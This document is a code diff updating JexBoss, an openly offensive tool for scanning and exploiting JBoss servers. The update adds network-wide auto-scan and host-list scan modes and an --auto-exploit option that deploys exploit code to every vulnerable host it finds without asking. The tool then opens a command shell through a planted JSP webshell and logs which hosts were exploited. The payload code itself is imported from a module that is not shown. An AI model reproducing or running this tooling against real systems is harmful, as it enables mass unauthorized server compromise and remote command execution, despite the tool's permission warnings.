@@ -18,6 +18,10 @@ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
 """
+import textwrap
+import traceback
+from idlelib.ColorDelegator import prog
+from urllib3.util import parse_url
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -28,8 +32,9 @@ NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.7"
+__version = "1.0.8"
 
+import sys
 from sys import argv, exit, version_info
 from _exploits import *
 from _updates import *
@@ -39,6 +44,9 @@ import shutil
 from zipfile import ZipFile
 from time import sleep
 from random import randint
+import argparse
+import ipaddress, socket
+
 try:
     from urllib.parse import urlencode
 except ImportError:
@@ -77,6 +85,7 @@ user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/201
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
 
+global gl_args
 
 def get_successfully(url, path):
     """
@@ -97,13 +106,38 @@ def get_successfully(url, path):
         result = r.status
     return result
 
+def check_connectivity(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((str(host), int(port)))
+        s.close()
+    except socket.timeout:
+        return False
+    except:
+        return False
+
+
+    return True
+
 def check_vul(url):
     """
     Test if a GET to a URL is successful
     :param url: The URL to test
     :return: A dict with the exploit type as the keys, and the HTTP status code as the value
     """
-    print(GREEN + " ** Checking Host: %s **\n" % url)
+    if gl_args.mode == 'auto-scan' or gl_args.mode == 'file-scan':
+        timeout = Timeout(connect=1.0, read=3.0)
+        pool = PoolManager(timeout=timeout, retries=1, cert_reqs='CERT_NONE')
+    else:
+        timeout = Timeout(connect=3.0, read=6.0)
+        pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
+
+    url_check = parse_url(url)
+    if '443' in str(url_check.port) and url_check.scheme != 'https':
+        url = "https://"+str(url_check.host)+":"+str(url_check.port)
+
+    print(GREEN + "\n ** Checking Host: %s **\n" % url)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
@@ -144,7 +178,7 @@ def auto_exploit(url, exploit_type):
     exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
     exploitWebConsoleInvoker:		 tested and working in JBoss 4
     exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
-    exploitAdminConsole: tested and working in JBoss 6 (with default password)
+    exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
     """
     print(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
     result = 505
@@ -162,12 +196,20 @@ def auto_exploit(url, exploit_type):
         result = exploit_admin_console(url)
 
     if result == 200 or result == 500:
-        print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
-        shell_http(url, exploit_type)
+        if not gl_args.auto_exploit:
+            print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
+            shell_http(url, exploit_type)
+        else:
+            print(GREEN + " * Successfully deployed code via vector %s\n *** Run JexBoss in Standalone mode to open command shell. ***" %(exploit_type) + ENDC)
+            return True
     else:
         print(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
                     "   Waiting for 7 seconds...\n " + ENDC)
-        sleep(7)
+        if gl_args.mode == 'standalone':
+            sleep(7)
+            return False
+        else:
+            return False
 
 def shell_http(url, shell_type):
     """
@@ -178,6 +220,9 @@ def shell_http(url, shell_type):
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
+
+    if gl_args.disable_check_updates:
+        headers['check-updates'] = 'false'
 
     if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
         path = '/jexws/jexws.jsp?'
@@ -228,17 +273,6 @@ def clear():
     elif name == ('ce', 'nt', 'dos'):
         system('cls')
 
-def check_args(args):
-    """
-    Check the command-line arguments
-    :param args: The arguments to check
-    :returns: Exit code, message
-    """
-    if len(args) < 2 or args[1].count('.') < 1:
-        return 1, "You must provide the host name or IP address you want to test."
-    else:
-        return 0, ""
-
 def banner():
     """
     Print the banner
@@ -251,7 +285,30 @@ def banner():
                  " |                                                      |\n"
                  " | @update: https://github.com/joaomatosf/jexboss       |\n"
                  " #______________________________________________________#\n")
-    print(RED1 + " @version: %s\n"%__version)
+    print(RED1 + " @version: %s\n"%__version )
+
+    print (ENDC)
+
+def help_usage():
+    usage = (BOLD + BLUE + "\n Examples:\n" + ENDC +
+    BLUE + "\n For simple usage, you must provide the host name or IP address you want to test:" +
+    GREEN + "\n\n  $ python jexboss.py -host https://site.com.br" +
+    BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, list of ports and filename for store results:" +
+    GREEN + "\n\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log" +
+    BLUE + "\n\n For file scan mode, you must provide the filename with host list to be scanned (one host per line)and filename for store results:" +
+    GREEN + "\n\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log" + ENDC)
+    return usage
+
+def network_args(string):
+    try:
+        if version_info[0] >= 3:
+            value = ipaddress.ip_network(string)
+        else:
+            value = ipaddress.ip_network(unicode(string))
+    except:
+        msg = "%s is not a network address in CIDR format." % string
+        raise argparse.ArgumentTypeError(msg)
+    return value
 
 def main():
     """
@@ -267,39 +324,93 @@ def main():
         print (ENDC)
         if pick != "no":
             updated = auto_update()
-            if updates:
+            if updated:
                 print(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
                 exit(0)
             else:
                 print(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
                 exit(1)
-    # check Args
-    status, message = check_args(argv)
-    if status == 0:
-        url = argv[1]
-    elif status == 1:
-        print(RED + "\n * Error: %s" % message)
-        print(BLUE + "\n Example:\n python %s https://site.com.br\n" % argv[0] + ENDC)
-        exit(status)
 
-    # check vulnerabilities
-    scan_results = check_vul(url)
+    vulnerables = False
+    # check vulnerabilities for standalone mode
+    if gl_args.mode == 'standalone':
+        url = gl_args.host
+        scan_results = check_vul(url)
+        # performs exploitation
+        for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
+            if scan_results[i] == 200 or scan_results[i] == 500:
+                vulnerables = True
+                if gl_args.auto_exploit:
+                    auto_exploit(url, i)
+                else:
+                    print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
+                          BOLD + i + NORMAL + "\" ?\n" +
+                          "   This operation will provide a simple command shell to execute commands on the server..\n" +
+                          RED + "   Continue only if you have permission!" + ENDC)
+                    pick = input("   yes/NO ? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO ? ").lower()
+                    if pick == "yes":
+                        auto_exploit(url, i)
+    # check vulnerabilities for auto scan mode
+    elif gl_args.mode == 'auto-scan':
+        file_results = open(gl_args.results, 'w')
+        file_results.write("JexBoss Scan Mode Report\n\n")
+        for ip in gl_args.network.hosts():
+            for port in gl_args.ports.split(","):
+                if check_connectivity(ip, port):
+                    url = "{0}:{1}".format(ip,port)
+                    ip_results = check_vul(url)
+                    for key in ip_results.keys():
+                        if ip_results[key] == 200 or ip_results[key] == 500:
+                            vulnerables = True
+                            if gl_args.auto_exploit:
+                                result_exploit = auto_exploit(url, key)
+                                if result_exploit:
+                                    file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
+                                else:
+                                    file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
+                            else:
+                                file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {}]\n".format(url, key))
 
-    # performs exploitation
-    for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
-        if scan_results[i] == 200 or scan_results[i] == 500:
-            print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
-                  BOLD + i + NORMAL + "\" ?\n" +
-                  "   This operation will provide a simple command shell to execute commands on the server..\n" +
-                  RED + "   Continue only if you have permission!" + ENDC)
-            pick = input("   yes/NO ? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO ? ").lower()
-            if pick == "yes":
-                auto_exploit(url, i)
+                            file_results.flush()
+                else:
+                    print (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
+        file_results.close()
+
+    elif gl_args.mode == 'file-scan':
+        file_results = open(gl_args.out, 'w')
+        file_results.write("JexBoss Scan Mode Report\n\n")
+        file_input = open(gl_args.file, 'r')
+        for url in file_input.readlines():
+            url = url.strip()
+            ip = str(parse_url(url)[2])
+            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
+            if check_connectivity(ip, port):
+                url_results = check_vul(url)
+                for key in url_results.keys():
+                    if url_results[key] == 200 or url_results[key] == 500:
+                        vulnerables = True
+                        if gl_args.auto_exploit:
+                            result_exploit = auto_exploit(url, key)
+                            if result_exploit:
+                                file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
+                            else:
+                                file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
+                        else:
+                            file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))
+
+                        file_results.flush()
+            else:
+                print (RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
+        file_results.close()
 
     # resume results
-    if list(scan_results.values()).count(200) > 0:
+    if vulnerables:
         banner()
         print(RED + BOLD+" Results: potentially compromised server!" + ENDC)
+        if gl_args.mode  == 'file-scan':
+            print(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
+        elif gl_args.mode == 'auto-scan':
+            print(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
         print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
              +BOLD+   " Recommendations: \n" +ENDC+
               GREEN+  " - Remove web consoles and services that are not used, eg:\n"
@@ -317,7 +428,7 @@ def main():
                       "\n"
                       " - If possible, discard this server!\n"
                       " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
-    elif list(scan_results.values()).count(505) == 0:
+    else:
         print(GREEN + "\n\n * Results: \n" +
               "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
     # infos
@@ -335,5 +446,56 @@ print(ENDC)
 
 banner()
 
+
 if __name__ == "__main__":
-    main()
+
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
+        description=textwrap.dedent(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
+                 " |                                                      |\n"
+                 " | @author:  João Filho Matos Figueiredo                |\n"
+                 " | @contact: joaomatosf@gmail.com                       |\n"
+                 " |                                                      |\n"
+                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
+                 " #______________________________________________________#\n"
+                 " @version: "+__version+"\n"+ help_usage()),
+        epilog="",
+        prog="JexBoss"
+    )
+
+    group_standalone = parser.add_argument_group('Standalone mode')
+    group_auto_scan = parser.add_argument_group('Auto scan mode')
+    group_file_scan = parser.add_argument_group('File scan mode')
+
+    parser.add_argument('--version', action='version', version='%(prog)s ' + __version)
+    parser.add_argument("--auto-exploit", "-A",
+                        help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
+                        action='store_true')
+    parser.add_argument("--disable-check-updates", "-D", help="Disable the check for updates performed by JSP Webshell at: http://webshell.jexboss.net/jsp_version.txt",
+                        action='store_true')
+    parser.add_argument('-mode', help="Operation mode", choices={'standalone','auto-scan', 'file-scan'}, default='standalone')
+
+    group_standalone.add_argument("-host", help="Host address to be checked (eg. http://192.168.0.10:8080)",
+                                  type=str)
+    group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
+                            type=network_args, default='192.168.0.0/24')
+    group_auto_scan.add_argument("-ports",
+                            help="List of ports separated by commas to be checked for each host (eg. 8080,8443,8888,80,443)", type=str, default='8080,80')
+    group_auto_scan.add_argument("-results",
+                            help="File name to store the auto scan results", type=str, metavar='FILENAME', default='jexboss_auto_scan_results.log')
+
+    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)", type=str, metavar='FILENAME_HOSTS')
+    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str, metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')
+
+    gl_args = parser.parse_args()
+
+    #if 'h' not in gl_args and gl_args.host == None:
+    #    parser.print_help()
+
+    if gl_args.mode == 'standalone' and gl_args.host == None or \
+        gl_args.mode == 'file-scan' and gl_args.file == None:
+        banner()
+        exit(0)
+    else:
+        main()
